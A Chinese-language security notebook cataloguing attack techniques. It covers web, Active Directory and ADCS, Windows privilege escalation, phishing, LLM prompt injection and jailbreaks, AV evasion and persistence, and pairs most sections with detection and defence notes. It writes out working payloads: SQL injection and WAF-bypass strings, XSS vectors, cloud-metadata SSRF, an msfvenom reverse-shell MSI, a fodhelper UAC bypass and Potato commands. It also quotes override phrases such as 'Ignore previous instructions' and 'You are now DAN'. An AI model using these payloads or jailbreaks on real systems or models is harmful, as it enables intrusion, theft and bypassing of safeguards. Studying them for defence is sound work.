# Attack Techniques - 攻击手法库

_安全虾收集的攻击手法，持续更新。_

---

## 一、Web 攻击

### 1. SQL 注入 (SQL Injection)

**经典手法：**
- 联合查询注入：`' UNION SELECT 1,2,3--`
- 盲注：布尔盲注、时间盲注
- 堆叠查询：`; DROP TABLE users--`
- 二次注入：在存储时注入，在其他查询中触发

**WAF 绕过：**
- 大小写混用：`uNiOn SeLeCt`
- 注释绕过：`UN/**/ION SEL/**/ECT`
- 编码绕过：URL 编码、双重编码、Unicode
- 内联注释 MySQL 特性：`/*!50000UNION*//*!50000SELECT*/`
- HTTP 参数污染：`id=1&id=2`（不同服务器取值不同）

### 2. XSS (Cross-Site Scripting)

**类型：**
- 反射型：URL 参数直接回显
- 存储型：存入数据库，其他用户触发
- DOM 型：纯前端 JS 渲染触发

**绕过技巧：**
- 事件处理器：`onerror`, `onload`, `onfocus`, `onmouseover`
- 编码绕过：HTML 实体、JS Unicode、Base64
- SVG/MathML：`<svg onload=alert(1)>`
- 模板字面量：反引号替代括号
- Content-Security-Policy 绕过：JSONP 端点、base 标签、dns-prefetch

### 3. SSRF (Server-Side Request Forgery)

**协议利用：**
- `file:///etc/passwd` — 本地文件读取
- `http://169.254.169.254/` — 云元数据
- `gopher://` — 构造任意 TCP 包（Redis、MySQL、FastCGI）
- `dict://` — 探测服务

**绕过技巧：**
- IP 进制转换：`0x7f000001` = `127.0.0.1`
- DNS 重绑定：域名先解析到外网，再解析到内网
- URL 解析差异：`http://evil@127.0.0.1:80`
- 302 跳转绕过：外网 302 到内网

### 4. 反序列化漏洞

**Java：**
- CommonCollections 利用链（CC1-CC7）
- CommonsBeanutils、Spring、Fastjson
- JRMP/JMX 利用
- Shiro 550/721（RememberMe 反序列化）

**PHP：**
- `unserialize()` + POP 链
- Phar 反序列化（不需要 `unserialize`）
- Symfony、Laravel、Yii 的 POP 链

**Python：**
- `pickle.loads()` 任意代码执行
- `yaml.load()`（非 safe_load）
- `marshal` / `shelve`

### 5. 文件上传绕过

- 双重扩展名：`shell.php.jpg`
- 大小写绕过：`shell.PhP`
- `.htaccess` / `web.config` 覆盖
- `%00` 截断（旧版本 PHP/Java）
- Content-Type 伪造
- 图片马 + 文件包含
- 竞争条件上传

### 6. JWT 攻击

- 算法替换攻击：`alg: "none"` 或 RS256 → HS256
- 弱密钥爆破：`jwt-cracker`、字典攻击
- JWK / jku 注入
- Kid 注入：`kid: "../../dev/null"` + `alg: none`

### 7. Session 攻击

**Session Fixation（会话固定）：**
- 攻击者预设一个 session ID，诱导受害者使用该 ID 登录
- 登录后 session 绑定到攻击者的 ID，攻击者用同一 ID 获取已认证会话
- **典型载体：** URL 参数注入 session ID（`?PHPSESSID=attacker_controlled`）、Cookie 注入
- **实例：** CVE-2021-47923 — OpenCart OCSESSID cookie 可被攻击者任意设置，服务器接受并维持该值
- **防御：** 登录后重新生成 session ID、`HttpOnly`/`Secure`/`SameSite` cookie 属性、服务端 session 绑定 IP/UA

**Session Hijacking（会话劫持）：**
- 窃取有效 session token → 冒充用户
- **窃取路径：**
  - XSS 读取 `document.cookie`（HttpOnly 可防）
  - 网络嗅探（HTTP 明文传输）
  - 服务端日志/Referer 泄露
  - 中间人攻击
- **防御：** HTTPS 强制、短 session 超时、token 绑定

**Cookie 安全属性：**
- `HttpOnly` — 禁止 JS 读取，防 XSS 窃取
- `Secure` — 仅 HTTPS 传输
- `SameSite=Strict/Lax` — 防 CSRF
- `Domain`/`Path` 限制 — 缩小 cookie 作用域

**Session Token 预测：**
- 旧系统用时间戳或可预测值生成 session ID
- 攻击者枚举 session ID 范围 → 碰撞有效会话
- **防御：** 使用 CSPRNG 生成 session ID（至少 128 位熵）

**Session 固定 vs 劫持的区别：**
- 固定：攻击者**预先知道** session ID（主动注入）
- 劫持：攻击者**事后窃取**有效 session ID（被动获取）

### 8. SSRF 到 RCE 常见链路

**云环境：**
SSRF → 元数据 → IAM 凭证 → 枚举服务 → 提权 → EC2/Lambda 执行

**内网服务：**
SSRF → Redis（未授权）→ 写 SSH Key / Webshell / 计划任务
SSRF → MySQL（未授权）→ 写文件
SSRF → FastCGI → PHP 代码执行

### 9. 竞争条件 (Race Condition / TOCTOU)

**原理：**
- 两个或多个并发操作同时访问共享资源，最终结果取决于执行时序
- TOCTOU (Time-of-Check to Time-of-Use)：检查时状态合法，使用时已被篡改
- CWE-362/367/364

**常见场景：**

```python
# 典型竞争条件：余额检查与扣款
if user.balance >= amount:    # CHECK
    time.sleep(0.1)            # 延迟（实际场景可能是网络/DB延迟）
    user.balance -= amount     # USE — 此时另一个请求可能已经修改了 balance
    user.save()
```

**Web 应用竞争条件：**
- **余额/积分操作：** 重复请求绕过余额检查 → 双花/免费获取
- **优惠券/令牌使用：** 并发请求同一优惠券 → 多次使用
- **文件上传：** 检查文件类型后、写入前的竞态窗口 → 写入 webshell
- **竞态条件上传：** 后端先保存再检查 → 反复上传直到命中检查窗口
- **注册/邀请码：** 同一邀请码被多人同时使用

**检测方法：**
- Burp Intruder 并发线程（Turbo Intruder / race PoC）
- 多线程 curl 脚本
- 浏览器多标签同时提交
- 时间戳差异分析（响应时间异常短 = 命中竞态）

**利用技巧：**
- Burp Suite：Intruder → Resource Pool → 高并发线程组
- Turbo Intruder：`race(100, ...)` 100 个并发请求
- Python `asyncio` + `aiohttp` 批量并发
- 竞态窗口越大越容易命中（加 sleep / 大 payload / 慢速网络）

**经典漏洞模式：**
```
1. 购买请求 × N 并发 → 余额只扣一次，商品获得 N 份
2. 转账请求 × N 并发 → 余额检查通过 N 次 → 多次转出
3. 上传请求 × N 并发 → 文件写入后、类型检查前 → 命中 webshell
4. 邀请码 × N 并发 → 同一码被 N 人使用
```

**防御：**
- 数据库行锁 / `SELECT FOR UPDATE` 原子操作
- 乐观锁（版本号）：`UPDATE ... SET balance = balance - 100 WHERE version = ?`
- 悲观锁 / 分布式锁（Redis `SETNX`）
- 幂等性设计：token / nonce 机制
- 原子操作：`UPDATE users SET balance = balance - amount WHERE id = ? AND balance >= amount`
- 文件上传：先存临时目录 → 检查通过再移动 → 竞态窗口内无法访问

### 10. GraphQL 攻击

**GraphQL 特有攻击面：**

GraphQL 是一种查询语言，提供单一端点、强类型 schema、内省能力。这些特性带来独特攻击面。

**内省攻击 (Introspection)：**
```graphql
# 暴露整个 API schema
{
  __schema {
    types {
      name
      fields {
        name
        type { name }
      }
    }
    queryType { name }
    mutationType { name }
  }
}

# 暗字段（未文档化的管理员字段）
{
  __type(name: "User") {
    fields {
      name
      description
    }
  }
}
```

**批量查询攻击 (Batching)：**
```json
// 单次请求发送多个查询，绕过速率限制
[
  {"query": "{ user(id:1) { email } }"},
  {"query": "{ user(id:2) { email } }"},
  // ... 1000 个查询
  {"query": "{ user(id:1000) { email } }"}
]
// 1 次 HTTP 请求 = 1000 次数据查询，WAF/限速完全失效
```

**深度嵌套 DoS (Query Complexity)：**
```graphql
# 无限嵌套导致资源耗尽
{
  users {
    posts {
      comments {
        author {
          posts {
            comments {
              author {
                posts { ... }
              }
            }
          }
        }
      }
    }
  }
}
# 每层嵌套指数级增长，单个查询可拖垮数据库
```

**IDOR / 授权绕过：**
```graphql
# 正常查询自己的订单
query { order(id: "123") { total items } }

# 篡改 ID 查询他人订单 — GraphQL 不自动鉴权
query { order(id: "124") { total items } }

# 数字 ID 递增枚举
query { order(id: "1") { ... } }
query { order(id: "2") { ... } }
```

**批量赋值攻击 (Batch Assignment)：**
```graphql
# 正常注册
mutation {
  createUser(input: { name: "test", email: "test@example.com" }) {
    id
  }
}

# 注入管理员字段
mutation {
  createUser(input: {
    name: "hacker",
    email: "hacker@evil.com",
    role: "ADMIN",        # 批量赋值：添加 schema 未暴露但后端接受的字段
    isAdmin: true          # ORM 直接绑定到模型
  }) {
    id
  }
}
```

**Subscription 劫持：**
```graphql
# 订阅实时事件（聊天消息、通知等）
subscription {
  onNewMessage(chatId: "general") {
    content
    sender
  }
}

# 如果 chatId 未鉴权 → 监听所有聊天室
subscription {
  onNewMessage(chatId: "admin-internal") {
    content
    sender
  }
}
```

**SQL/NoSQL 注入（GraphQL 特有）：**
```graphql
# GraphQL 参数直接传入数据库查询
query {
  users(filter: { name: { contains: "admin" } }) {
    id
  }
}

# 如果 filter 参数未消毒 → NoSQL 注入
query {
  users(filter: { name: { "$ne": "" } }) {
    id email passwordHash
  }
}
# 返回所有用户！
```

**检测方法：**
- 监控 `__schema` / `__type` 内省查询
- 检测异常查询深度（`queryDepth` > 10）
- 批量查询数量异常（单请求 > 10 个查询）
- 查询复杂度超限告警
- 异常字段访问（未授权的敏感字段）

**防御：**
- 禁用内省（生产环境）：`introspection: false`
- 查询深度限制：最大 5-10 层
- 查询复杂度分析：为每个字段分配成本，总成本超限拒绝执行
- 批量查询限制：限制单请求数量（如最多 5-10 个）
- 速率限制：按查询复杂度而非请求数
- 字段级授权：每个字段/类型单独鉴权
- 输入验证：白名单验证所有输入参数
- 持久化查询 (Persisted Queries)：只允许预注册的查询

---

## 二、网络攻击

### 1. 内网渗透

**信息收集：**
- NetBIOS 枚举：`nbtscan`
- SMB 枚举：`enum4linux`、`smbclient`
- LDAP 枚举：`ldapsearch`
- DNS 区域传输：`dig axfr`
- ARP 扫描：`arp-scan -l`

**横向移动：**
- Pass-the-Hash：`pth-winexe`、`impacket-psexec`
- Pass-the-Ticket：Kerberos TGT/TGS 票据传递
- Golden Ticket：krbtgt hash 伪造 TGT
- Silver Ticket：服务 hash 伪造 TGS
- DCOM/WMI 远程执行
- WinRM 远程管理

**域渗透经典链：**
1. 获取域用户 → BloodHound 分析攻击路径
2. Kerberoasting → 服务账户 hash → 离线破解
3. AS-REP Roasting → 不需要预认证的用户
4. ACL 滥用 → GenericAll/WriteDacl → 重置密码
5. DCSync → 域管 hash → Golden Ticket → 持久化

### 2. 无线攻击

- Evil Twin（伪造 AP）
- WPA2 四次握手抓包 → 离线破解
- PMKID 攻击（不需要客户端）
- KRACK 攻击（重装密钥）
- WPS PIN 暴力破解

### 3. ADCS 攻击（Active Directory Certificate Services）

**原理：**
ADCS 是微软的 PKI 基础设施，企业用它颁发和管理数字证书。配置不当的 ADCS 会成为强大的持久化和提权向量。

**核心攻击类型：**

| 攻击名称 | 条件 | 效果 |
|----------|------|------|
| ESC1 | CA 管理员 + Web 注册 | 任意用户伪装，请求任何模板证书 |
| ESC2 | CA 管理员 + Web 注册 | 请求任意 EKU（包括 CA 本身） |
| ESC3 | CA 管理员 + Web 注册 | 通过 Enrollment Agent 模板代理注册 |
| ESC4 | 模板 ACL 配置错误 | 修改模板，添加攻击者控制的 SAN |
| ESC6 | EDITF_ATTRIBUTESUBJECTALTNAME2 | 任何证书可添加自定义 SAN |
| ESC8 | HTTP 终端 + NTLM | NTLM Relay 到 ADCS HTTP 注册端点 |
| ESC9/ESC10 | 弱 CA 配置 | Web 注册认证绕过 |
| ESC11 | RPC 未签名 | NTLM Relay 到 DCOM/RPC |
| ESC13 | 服务账户模板 | 通过服务账户获取用户证书 |

**ESC1 详细利用（最经典）：**
```
1. 枚举可注册的证书模板 → Certify/Certipy
2. 发现 VulnerableUser 模板：
   - msPKI-Cert-Template-OID: 允许域用户注册
   - msPKI-RA-Signature: 0（无需 RA 审批）
   - ENROLLEE_SUPPLIES_SUBJECT: 允许指定 SAN
3. 用普通域用户请求该模板证书，指定 SAN 为域管理员
4. 导出证书 → 获取域管理员身份
5. 使用 Rubeus/PKIINIT 获取 TGT
```

**检测方法：**
- 监控异常证书请求（Event ID 4886/4887）
- 检查证书模板 ACL 变更
- 监控 SAN 与请求者不匹配的证书
- NTLM Relay 检测：异常的 NTLM 认证到 HTTP 端点

**工具：**
- **Certify** (C#) — ADCS 枚举 + 攻击
- **Certipy** (Python) — 跨平台 ADCS 攻击
- **BloodHound** — 收集 ADCS 攻击路径
- **Rubeus** — 证书 → TGT 转换
- **ntlmrelayx** — NTLM Relay 到 ADCS

**防御：**
- 审查所有证书模板 ACL，移除 ENROLLEE_SUPPLIES_SUBJECT
- 禁用不必要的 Web 注册终端
- 启用 ADCS Extended Protection（ESC8/ESC11 防护）
- 启用 HTTP 通道绑定（EPA）
- 定期审计证书颁发日志
- 移除低权限用户不需要的模板

### 4. Windows 权限提升

**服务漏洞提权：**

```powershell
# 枚举可修改的服务
accesschk.exe /accepteula -uwcqv "Authenticated Users" * 
accesschk.exe /accepteula -uwcqv "BUILTIN\Users" *

# 检查服务路径（Unquoted Service Path）
wmic service get name,displayname,pathname,startmode
# 找到无引号路径且包含空格的服务：C:\Program Files\My Service\service.exe
# 利用：放入 C:\Program.exe 或 C:\Program Files\My.exe

# 检查服务二进制权限
cacls "C:\Path\to\service.exe"
# 如果 BUILTIN\Users 有 (F) 或 (W) 权限 → 替换为恶意程序
```

**注册表提权：**

```powershell
# AlwaysInstallElevated 检查
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
# 两个都返回 0x1 → 任何用户安装 MSI 都以 SYSTEM 权限执行

# 利用：生成恶意 MSI
msfvenom -p windows/shell_reverse_tcp LHOST=attacker LPORT=4444 -f msi -o shell.msi
msiexec /quiet /qn /i shell.msi

# 可修改的注册表服务键
reg query HKLM\SYSTEM\CurrentControlSet\Services /s /f "ImagePath" | findstr /i "LocalSystem"
# 找到可写的服务 ImagePath → 修改为恶意程序路径
```

**Token 模拟提权：**

```powershell
# 偷取 Token（SeImpersonatePrivilege / SeAssignPrimaryTokenPrivilege）
# 服务账户、IIS 应用池、SQL Server 通常有这些特权

# Potato 系列攻击
PrintSpoofer.exe -c "cmd /c whoami"  # Windows Server 2008-2019
JuicyPotato.exe -l 1337 -p C:\temp\shell.exe -t * -c {CLSID}
GodPotato.exe -cmd "cmd /c whoami"  # Windows 8-2022

# PrintSpoofer 利用原理：
# 1. 创建命名管道，模拟 SYSTEM 连接
# 2. 触发 Spooler 服务连接管道
# 3. 服务以 SYSTEM 身份连接 → 获得 SYSTEM token
```

**DLL 劫持：**

```powershell
# 搜索可写目录中的 DLL 搜索路径
# 1. 程序加载顺序：程序目录 → 系统目录 → PATH 目录
# 2. 找到程序加载的 DLL 但目录可写 → 放入恶意 DLL

# Process Monitor 过滤：
# - Process Name = target.exe
# - Result = NAME NOT FOUND
# - Path ends with .dll
# 找到找不到的 DLL → 检查对应目录是否可写

# 常见劫持点：
# - 当前目录优先加载
# - PATH 中的可写目录
# - 可写的系统目录
```

**Potato 攻击原理（通用）：**
```
1. 攻击者获得服务账户（SeImpersonatePrivilege）
2. 创建本地命名管道 / TCP 端口
3. 触发特权进程（SYSTEM）连接攻击者控制的资源
4. 通过 NTLM 中继或 Token 模拟获取 SYSTEM 身份

关键前提：目标有 SeImpersonatePrivilege 或 SeAssignPrimaryTokenPrivilege
常见目标：SQL Server 服务、IIS 应用池、Windows 服务账户
```

**UAC 绕过：**

```powershell
# 检查 UAC 级别
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA
# 0 = 关闭, 1 = 开启

# 绕过方法（需要管理员组用户但 UAC 弹窗被自动允许时）
# Event Viewer → fodhelper.exe →绕过 UAC 执行
reg add HKCU\Software\Classes\ms-settings\Shell\Open\command /d "cmd.exe" /f
fodhelper.exe

# 或用计算机管理
eventvwr.exe → 搜索框 → 注册表路径劫持
```

**检测方法：**
- Sysmon Event ID 1：服务创建（异常 ImagePath）
- Sysmon Event ID 12/13：注册表创建/修改（Services 键）
- Windows Event ID 4688：进程创建（msiexec 异常调用）
- 服务异常启动日志（Event ID 7045）
- Token 模拟检测：异常的命名管道连接

**防御：**
- 及时修补服务漏洞
- 服务账户最小权限（禁用 SeImpersonatePrivilege）
- 禁用 AlwaysInstallElevated
- 启用 UAC 严格模式（ConsentPromptBehaviorAdmin=2）
- DLL 搜索顺序劫持防护（SafeDllSearchMode）
- 监控服务配置变更

---

## 三、社会工程

### 1. 钓鱼攻击

**邮件钓鱼：**
- SPF/DKIM/DMARC 绕过
- HTML 邮件模板伪造
- 附件：Office 宏、HTA、LNK、ISO
- 链接：域名仿冒、URL 缩短、二维码

**语音钓鱼 (Vishing)：**
- 来电显示伪造
- IT 支持社工
- 双因素认证绕过（攻击者实时获取验证码）

**鱼叉钓鱼：**
- 目标信息收集（LinkedIn、社交媒体）
- 定制化内容和诱饵
- 参考近期公开事件

### 2. 物理安全

- USB 投放（Rubber Ducky、BadUSB）
- 尾随进入
- 门禁卡克隆
- 网络接口物理接入

---

## 四、AI/LLM 攻击

### 1. Prompt Injection

**直接注入：**
- 指令覆盖："Ignore previous instructions and..."
- 角色扮演："You are now DAN..."
- 编码绕过：Base64、ROT13、其他语言

**间接注入：**
- 文档内嵌恶意指令
- 网页内容中的隐藏 prompt
- 邮件/评论中注入指令
- 图片中的文本指令（OCR 路径）

**越狱技术：**
- 多轮对话逐步引导
- 虚拟场景包装
- 翻译/编码链绕过
- 前缀注入

### 2. Agent 安全

**工具滥用：**
- 参数注入：通过 prompt 操纵工具参数
- 工具链攻击：组合多个工具实现恶意目标
- 权限提升：利用代理身份执行超出范围的操作

**数据泄露：**
- 通过工具调用外传数据
- 构造 prompt 使 LLM 输出系统 prompt
- 利用检索增强生成 (RAG) 泄露知识库

**多 Agent 攻击：**
- Agent 间通信劫持
- 协作链投毒
- 代理间信任关系利用

---

## 五、云/容器攻击

详见 `cloud-container-security.md` 专题文件。

---

## 六、免杀与红队技术

### 1. Shellcode 免杀

- 分离加载：shellcode 与 loader 分离
- 加密/编码：AES/XOR/自定义算法
- 动态解密：运行时解密执行
- 内存加载：反射式 DLL 注入
- Syscall 直接调用：绕过用户态 hook
- Unhooking：修复被 hook 的 ntdll

### 2. C2 通信

- 域前置 (Domain Fronting)
- CDN 中转
- DNS 隧道
- HTTPS 加密
- 流量混淆

### 3. 持久化

- 注册表启动项
- 计划任务
- WMI 事件订阅
- 服务创建
- DLL 劫持
- COM 劫持

---

_攻击手法千千万，记下来才能用。_
